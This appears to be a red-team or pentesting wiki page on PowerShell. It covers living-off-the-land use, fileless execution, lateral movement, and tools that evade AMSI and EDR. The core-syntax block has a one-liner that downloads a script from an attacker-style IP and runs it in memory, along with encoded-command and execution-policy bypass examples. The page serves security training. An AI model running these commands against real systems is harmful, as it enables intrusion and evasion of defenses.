# PowerShell

PowerShell is Microsoft's command-line shell and scripting language, built on .NET, present by default on every modern Windows system. Its deep integration with the OS (WMI, .NET assemblies, remote management) makes it one of the most heavily used tools for both legitimate administration and offensive tradecraft — it can download, execute, and manipulate almost anything on a Windows host without ever writing a traditional executable to disk.

## Common Use Cases

* Living-off-the-land execution: running commands/scripts using a signed, trusted binary already on the system
* In-memory ("fileless") payload execution via reflective loading
* Remote administration and lateral movement (PowerShell Remoting / WinRM)
* Enumeration and post-exploitation scripting (AD enumeration, credential access, persistence)

## Core Syntax

```
# Download and execute a script in memory
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/script.ps1')

# Base64-encoded command (bypasses some quoting/escaping issues, common in payload delivery)
powershell.exe -enc <base64 string>

# Bypass execution policy for a single session
powershell.exe -ExecutionPolicy Bypass -File script.ps1

# Common enumeration cmdlets
Get-Process
Get-LocalGroupMember -Group Administrators
Get-NetTCPConnection
```

#### PowerShell Alternatives (if blocked by policy)

* [Not PowerShell (nps)](https://github.com/jbarcia/nps)
* [PS-Attack](https://github.com/Exploit-install/PSAttack-1/)
* [PowerShdll](https://github.com/p3nt4/PowerShdll)

{% hint style="warning" %}
PowerShell is one of the most heavily monitored parts of modern Windows. Script Block Logging (Event ID 4104) and Module Logging capture executed code even through obfuscation/encoding, and AMSI (Antimalware Scan Interface) inspects scripts and in-memory buffers before execution. Expect encoded/obfuscated one-liners and known offensive frameworks (Empire, PowerSploit, PowerView) to be flagged by any modern EDR — the alternatives above exist specifically to run PowerShell-equivalent functionality without invoking `powershell.exe` itself or tripping AMSI.
{% endhint %}

## Related

* CrackMapExec / NetExec — often used to deliver PowerShell payloads across multiple hosts
* Evil-WinRM — interactive PowerShell-based shell over WinRM
